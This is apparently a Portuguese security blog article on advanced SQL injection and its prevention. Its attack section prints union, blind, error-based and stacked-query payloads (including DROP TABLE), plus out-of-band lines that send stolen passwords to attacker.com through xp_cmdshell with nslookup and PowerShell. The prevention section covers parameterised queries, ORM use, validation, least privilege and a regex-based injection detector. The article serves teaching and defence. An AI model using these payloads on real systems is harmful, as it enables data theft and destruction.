---
title: "SQL Injection Avançada: Técnicas e Prevenção"
description: "Exploração avançada de vulnerabilidades SQL Injection e estratégias robustas de prevenção em diferentes plataformas."
pubDate: 2026-09-28
tags:
  - Security
  - AppSec
  - Vulnerabilidade
  - Web
---

## Introdução

SQL Injection permanece como uma das vulnerabilidades mais críticas, figurando no topo do OWASP Top 10. Este artigo explora técnicas avançadas de exploração e, mais importante, metodologias comprovadas de prevenção.

## SQL Injection Básica vs Avançada

### Injeção Clássica

```sql
-- Entrada do usuário: admin' OR '1'='1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '';

-- Resultado: retorna todos os usuários
```

### Injeção Cega (Blind SQL Injection)

Quando a resposta não mostra dados diretamente, usamos técnicas de inferência:

```sql
-- Teste condicional
admin' AND (SELECT COUNT(*) FROM users) > 0 AND '1'='1

-- Time-based blind
admin' AND SLEEP(5) AND '1'='1
-- Se a resposta demora 5 segundos, a condição é verdadeira
```

### Injeção baseada em Erro (Error-based)

```sql
-- Extraindo informações através de erros
admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) AND '1'='1

-- Erro resultante:
-- XPATH syntax error: '~database_name'
```

## Exploração Através de Diferentes Camadas

### 1. Union-based Injection

```sql
-- Descobrindo número de colunas
' UNION SELECT NULL, NULL, NULL FROM users WHERE '1'='1

-- Extraindo dados
' UNION SELECT username, password, email FROM users WHERE '1'='1

-- Estrutura completa:
SELECT id, name FROM products WHERE id = 1 
UNION SELECT username, password FROM users-- 
```

### 2. Stacked Queries (quando suportado)

```sql
-- Alguns bancos permitem múltiplas queries
'; DROP TABLE users; --
'; INSERT INTO users VALUES ('attacker', 'password123'); --
'; UPDATE products SET price = 0; --
```

### 3. Out-of-Band Injection

Quando há restrições, dados são exfiltrados via canais alternativos:

```sql
-- DNS exfiltration (SQL Server)
'; EXEC xp_cmdshell 'nslookup ' + 
    (SELECT TOP 1 password FROM users) + '.attacker.com'; --

-- HTTP exfiltration
'; EXEC xp_cmdshell 'powershell "Invoke-WebRequest -Uri ' +
    'http://attacker.com/?data=' + 
    (SELECT TOP 1 CONVERT(varchar, password) FROM users) + '"'; --
```

## Prevenção Robusta

### 1. Prepared Statements (Recomendado)

```python
# Python com psycopg2
import psycopg2

conn = psycopg2.connect("dbname=test user=postgres")
cur = conn.cursor()

# Correto: parâmetros separados da query
user_id = request.args.get('id')
cur.execute("SELECT * FROM users WHERE id = %s", (user_id,))

results = cur.fetchall()
cur.close()
conn.close()
```

```javascript
// Node.js com pg
const { Pool } = require('pg');
const pool = new Pool();

// Correto
const userId = req.query.id;
const result = await pool.query(
    'SELECT * FROM users WHERE id = $1',
    [userId]
);
```

```php
// PHP com PDO
$pdo = new PDO('mysql:host=localhost;dbname=test', 'user', 'pass');

// Correto
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
$stmt->execute([$_GET['id']]);
$result = $stmt->fetchAll();

// Ou com named parameters
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id AND email = :email');
$stmt->execute([':id' => $id, ':email' => $email]);
```

### 2. ORM (Object-Relational Mapping)

```python
# SQLAlchemy (Python)
from sqlalchemy import select
from models import User

# Seguro - ORM maneja parametrização
user_id = request.args.get('id')
result = session.execute(
    select(User).where(User.id == user_id)
)

# Evitar query string raw
# session.query("SELECT * FROM users WHERE id = '" + user_id + "'")  # PERIGOSO!
```

### 3. Input Validation e Sanitização

```python
from typing import Union
import re

def validate_user_input(user_input: str, input_type: str) -> Union[str, int, bool]:
    """Validação rigorosa de entrada"""
    
    # Whitelist de emails
    if input_type == 'email':
        if re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', user_input):
            return user_input
        raise ValueError("Email inválido")
    
    # ID inteiro
    elif input_type == 'id':
        if re.match(r'^\d+$', user_input):
            return int(user_input)
        raise ValueError("ID deve ser numérico")
    
    # Username com caracteres específicos
    elif input_type == 'username':
        if re.match(r'^[a-zA-Z0-9_]{3,20}$', user_input):
            return user_input
        raise ValueError("Username inválido")
    
    return user_input
```

### 4. Least Privilege Principle

```sql
-- Criar usuário com permissões mínimas
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';

-- Apenas SELECT permitido
GRANT SELECT ON database.* TO 'app_user'@'localhost';

-- Para operações específicas
GRANT SELECT, INSERT, UPDATE ON database.users TO 'app_user'@'localhost';

-- Nunca:
-- GRANT ALL PRIVILEGES ON *.* TO 'app_user'@'localhost';
```

## Testes de Segurança

### Ferramentas Automatizadas

```bash
# OWASP ZAP
zaproxy -cmd -quickurl http://target.com -quickout report.html

# sqlmap
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Burp Suite (versão comercial)
```

### Teste Manual

```bash
# Teste simples
curl "http://target.com/user.php?id=1' OR '1'='1"

# Time-based blind
curl "http://target.com/user.php?id=1 AND SLEEP(5)"

# Union-based
curl "http://target.com/user.php?id=1 UNION SELECT NULL,NULL,NULL"
```

## Mitigação em Tempo Real

### Web Application Firewall (WAF)

```
Regras ModSecurity para SQL Injection:
- Detectar keywords suspeitas: UNION, SELECT, DROP, INSERT
- Bloquear múltiplas aspas consecutivas
- Validar codificação de caracteres
- Limitar tamanho de parâmetros
```

### Logging e Monitoramento

```python
import logging

class SQLInjectionDetector:
    SUSPICIOUS_PATTERNS = [
        r"('\s*OR\s*')|(\d\s*OR\s*\d)",
        r"(UNION.*SELECT)",
        r"(DROP|DELETE|TRUNCATE).*TABLE",
        r"(INSERT.*INTO.*VALUES)",
        r"(;.*--)",
    ]
    
    @staticmethod
    def check_query(query: str) -> bool:
        for pattern in SQLInjectionDetector.SUSPICIOUS_PATTERNS:
            if re.search(pattern, query, re.IGNORECASE):
                logging.warning(f"Possible SQL Injection: {query}")
                return True
        return False
```

## Conclusão

A defesa contra SQL Injection requer:

1. **Prepared Statements** como primeira linha de defesa
2. **Input Validation** rigorosa com whitelist
3. **Least Privilege** para credenciais de banco
4. **Monitoramento** contínuo de queries suspeitas
5. **Testes regulares** de penetração

### Referências

- OWASP SQL Injection
- CWE-89: SQL Injection
- NIST Guide to SQL Injection Prevention
